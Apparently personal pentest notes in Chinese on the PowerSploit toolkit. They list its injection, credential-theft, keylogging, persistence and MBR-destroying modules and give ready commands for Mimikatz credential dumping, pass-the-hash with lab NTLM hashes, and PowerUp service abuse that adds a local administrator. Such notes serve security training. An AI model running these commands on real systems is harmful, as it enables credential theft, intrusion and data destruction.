# PowerSploit

PowerSploit是Microsoft PowerShell模块的集合，可用于在评估的所有阶段帮助渗透测试人员。上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。

github:`https://github.com/PowerShellMafia/PowerSploit`

## powershell脚本分类以及功能

一、AntivirusBypass(绕过杀毒)

1. Find-AVSignature   发现杀软的签名

二、CodeExecution(代码执行)

1. Invoke-DllInjection.ps1  DLL注入脚本 注意dll架构要与目标进程相符，同时要具备相应的权限
2. Invoke-ReflectivePEInjection.ps1   反射型注入 将Windows PE文件（DLL / EXE）反射加载到powershell进程中，或反射地将DLL注入远程进程
3. Invoke-Shellcode.ps1   将shellcode插入您选择的进程ID或本地PowerShell中
4. Invoke-WmiCommand.ps1  在目标主机使用wmi执行命令

三、Exfiltration(信息收集)    #这个文件夹主要是收集目标主机上的信息

1. Out-Minidump.ps1              生成一个进程的全内存小数据库
2. Get-VaultCredential.ps1 显示Windows徽标凭据对象，包括明文Web凭据
3. Get-Keystrokes.ps1       记录按键，时间和活动窗口
4. Get-GPPPassword.ps1          检索通过组策略首选项推送的帐户的明文密码和其他信息
5. Get-GPPAutologon.ps1        如果通过组策略首选项推送，则从registry.xml检索自动登录用户名和密码
6. Get-TimedScreenshot.ps1    这是一个以定期间隔拍摄屏幕并将其保存到文件夹的功能
7. Invoke-Mimikatz.ps1            查看主机密码
8. Invoke-NinjaCopy.ps1          通过读取原始卷并解析NTFS结构，从NTFS分区卷复制文件
9. Invoke-CredentialInjection.ps1    使用明文凭据创建登录，而不会触发可疑事件ID 4648（显式凭证登录）
10. Invoke-TokenManipulation.ps1         列出可用的登录令牌。与其他用户创建进程登录令牌，并模仿当前线程中的登录令牌
11. Get-MicrophoneAudio.ps1        通过麦克风记录声音
12. VolumeShadowCopyTools.ps1

四、Recon(信息侦察)   # 这个文件夹主要是以目标主机为跳板进行内网主机侦察

1. Invoke-Portscan.ps1      端口扫描
2. Get-HttpStatus.ps1       返回指定路径的HTTP状态代码和完整URL，并附带字典文件
3. Invoke-ReverseDnsLookup.ps1  扫描DNS PTR记录的IP地址范围
4. PowerView.ps1            PowerView是一系列执行网络和Windows域枚举和利用的功能
5. Get-ComputerDetails      获得登录信息

五、ScriptModification(脚本修改)

1. Out-EncodedCommand.ps1    将脚本或代码块编码，并为PowerShell有效载荷脚本生成命令行输出
2. Out-EncryptedScript.ps1   加密文本文件/脚本
3. Out-CompressedDll.ps1   压缩，Base-64编码，并输出生成的代码，以将受管理的DLL加载到内存中
4. Remove-Comments.ps1       从脚本中删除注释和多余的空白

六、Persistence(权限维持)

1. New-UserPersistenceOption  为添加持久性函数配置用户级持久性选项。
2. New-ElevatedPersistenceOption   为添加持久性函数配置提升的持久性选项。
3. Add-Persistence    向脚本添加持久性功能
4. Install-SSP        安装安全支持提供程序（ssp）dll
5. Get-SecurityPackages

七、Privesc(提权)

1. PowerUP: 共同特权升级检查的信息交换所，以及一些武器化载体
2. Get-System

八、Mayhem(蓝屏破坏脚本)

1. Set-MasterBootRecord   选择的消息覆写主引导记录
2. Set-CriticalProcess  退出powershell时使系统蓝屏

## CodeExecution(代码执行)

### Invoke-Shellcode.ps1(执行shellcode)

```powershell
你要有一个Shellcode脚本
Invoke-Shellcode -Shellcode ($buf)
```

### Invoke-DllInjection.ps1(DLL注入脚本)

```powershell
你要有一个dll脚本
Invoke-DllInjection -ProcessID 3632 -Dll .\test.dll
```

## Recon(信息侦察)

### Invoke-Portscan.ps1(端口扫描)

```powershell
Invoke-Portscan -Hosts 192.168.102.1/24 -Ports "1-65535"
```

## Exfiltration(信息收集)

- Get-VaultCredential(抓取Windows vault 中保存的各种密码)

```powershell
Get-VaultCredential
```

### Get-TimedScreenshot.ps1(定期间隔拍摄屏幕)

```powershell
Get-TimedScreenshot -Path c:\temp\ -Interval 5 -EndTime 11:23  # 每5秒截一次图,到11:23时结束
```

### Invoke-Mimikatz.ps1(查看主机密码)

```powershell
Invoke-Mimikatz -DumpCreds
```

### Get-Keystrokes.ps1(记录按键)

```powershell
Get-Keystrokes -LogPath 1.txt # 并不好用，缺失
```

### Invoke-NinjaCopy.ps1(复制文件)

```powershell
Invoke-NinjaCopy -Path "文件在哪里" -LocalDestination "要到哪里去"
```

- Invoke-Mimikatz.ps1

```powershell
# 获取管理员的哈希
.\Invoke-MimikatzEx.ps1

# 以管理员身份运行域中的powershell(需要替换ntlm值)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'

Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'

Find-LocalAdminAccess   # 判断可以去连接的域机器

Enter-Pssession -Computername dcorp-dc  # 连接到dc
Get-AppLockerPolicy -Effective | select -ExpandProperty rulecollections # 获取主机文件权限
```

- Invoke-MimikatzEx.ps1

```pwoershell
./Invoke-MimikatzEx.ps1   # 直接获取哈希
```

## 提权

```powershell
– PowerUp
Invoke-AllChecks

– BeRoot is an executable:
.\beRoot.exe

– Privesc:
Invoke-PrivEsc
```

### PowerUP

- 服务枚举

```powershell
Get-ServiceUnquoted                 # 获取具有未引用路径且名称中有空格的服务
Get-ModifiableServiceFile           # 获取当前用户可以写入服务二进制路径或其配置的服务
Get-ModifiableService               # 获取当前用户可以修改的服务
Get-ServiceDetail 'AbyssWebServer'  # 获取指定服务(AbyssWebServer)的详细信息
```

- 服务滥用

```powershell
# 修改易受攻击的服务以创建本地管理员或执行自定义命令
Write-ServiceBinary      # 写出一个修补过的`c\#`服务二进制文件，添加一个本地管理员或者执行一个自定义命令
Install-ServiceBinary    # 将服务二进制文件替换为添加本地管理员或执行自定义命令的二进制文件
Restore-ServiceBinary    # 使用原始可执行文件还原被替换的服务二进制文件
```

- DLL劫持

```powershell
Find-ProcessDLLHijack   # 发现当前运行进程的潜在DLL劫持机会
Find-PathDLLHijack      # 发现服务器路径 DLL劫持机会
Write-HijackDll         # 写出一个可劫持的DLL

```

- 注册表检查

```powershell
Get-RegistryAlwaysInstallElevated   # 检查是否设置了“始终安装”提升的注册表项
Get-RegistryAutoLogon               # 检查注册中心中的自动登录凭据
Get-ModifiableRegistryAutoRun       # 检查HKLM自动运行程序中任何可修改的二进制文件/脚本(或它们的配置)
```

- 杂项检查

```powershell
Get-ModifiableScheduledTaskFile   # 找到具有可修改目标文件的任务
Get-UnattendedInstallFile         # 找到剩余的无人值守的安装文件
Get-Webconfig                     # 检查任何加密的web。配置字符串
Get-ApplicationHost               # 检查加密的应用程序池和虚拟目录密码
Get-SiteListPassword              # 检索找到的任何密码的明文McAfee's SiteList.xml 文件
Get-CachedGPPPassword             # 检查缓存的组策略首选项文件中的密码
```

- 其他辅助功能/元功能

```powershell
Get-ModifiablePath              # 标记输入字符串并返回其中当前用户可以修改的文件
Get-CurrentUserTokenGroupSid    # 返回当前用户所属的所有sid，无论是否禁用它们
Add-ServiceDacl                 # 向Get-Service返回的服务对象添加Dacl字段
Set-ServiceBinPath              # 通过Win32 API方法将服务的二进制路径设置为指定的值
Test-ServiceDaclPermission      # 针对给定的权限集测试一个或多个通过的服务或服务名称
Write-UserAddMSI                # 写出一个MSI安装程序，提示添加用户
Invoke-AllChecks                # 运行所有当前升级检查并返回报告
```

- 提权案例

```powershell
Get-Wmiobject -class win32_service | select pathname    # 获取文件的路径
Import-Module ./PowerUp.ps1
Get-ModifiableServiceFile -Verbose      # 获取可修改的服务
Get-ModifiableService       # 获取可修改的服务
Get-ServiceUnquoted     # 获取可以修改的服务
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student41'  # 将用户注入到管理员组
# 使用cmd查看组的命令去查看是否加入到administrators组
net localgroup "Administrators"
```
